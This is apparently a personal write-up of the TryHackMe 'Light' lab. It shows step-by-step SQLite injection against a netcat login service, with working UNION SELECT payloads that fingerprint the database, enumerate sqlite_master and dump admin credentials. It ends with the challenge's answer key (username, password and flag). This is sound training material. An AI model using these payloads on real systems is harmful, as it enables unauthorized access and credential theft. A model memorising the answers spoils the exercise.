# TryHackMe Light: Full Walkthrough & SQL Injection Exploit

Recently, I tackled the **"Light"** challenge on TryHackMe, which was a fun and beginner-friendly box focused on **SQL injection in SQLite**. Here's a full breakdown of how I approached and solved it, along with insights into some interesting SQLi behavior.

## Challenge Setup

When connecting to the machine on port **1337** using `nc`, we're greeted with a login prompt:

**nc 10.10.39.206 1337**
You'll see:

Welcome to the Light database!
Please enter your username:

##Testing for SQL Injection

I started with classic test inputs:

Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL

Please enter your username: admin
Username not found.

Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"

That error suggests SQL queries are constructed in a vulnerable way. This confirmed SQL Injection is possible.

Understanding the Query Structure

I noticed that a malformed username like:

**smokey' '**

gave:

**Error: near "''": syntax error**

This suggests the query might be something like:

**SELECT password FROM users WHERE username = '<input>' LIMIT 30;**

I also saw that using SQL comments like --, /*, or encoded characters like %0b were blocked:

Please enter your username: smokey' --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)

##Bypassing Filters and Identifying the Database Type
At first, I assumed the backend was using MySQL, so I tested common MySQL-specific payloads like:

' UNION SELECT @@version

But got:

Error: unrecognized token: "@"

This ruled out MySQL. I also tried payloads for PostgreSQL and other DBMS, but nothing worked.

Eventually, I tried:

**Please enter your username: ' Union Select sqlite_version()'
Password: 3.31.1**

🎯 This confirmed two critical things:

The backend is using SQLite - sqlite_version() is a built-in SQLite function

SQL injection is fully working even without comments

##Extracting Tables and Data

To enumerate the tables:

Please enter your username: ' Union Select name FROM sqlite_master'
Password: admintable

We found a table named admintable. Let's dump its contents:

**Please enter your username: ' Union Select username || '~' || password from admintable'
Password: TryHackMeAdmin~mamZtAuMlrsEy5bp6q17**

Finally, we pulled the flag:

**Please enter your username: ' Union Select password from admintable'
Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}**

Answers
What is the admin username?
✅ TryHackMeAdmin

What is the password to the username mentioned in question 1?
✅ mamZtAuMlrsEy5bp6q17

What is the flag?
✅ THM{SQLit3_InJ3cTion_is_SimplE_nO?}
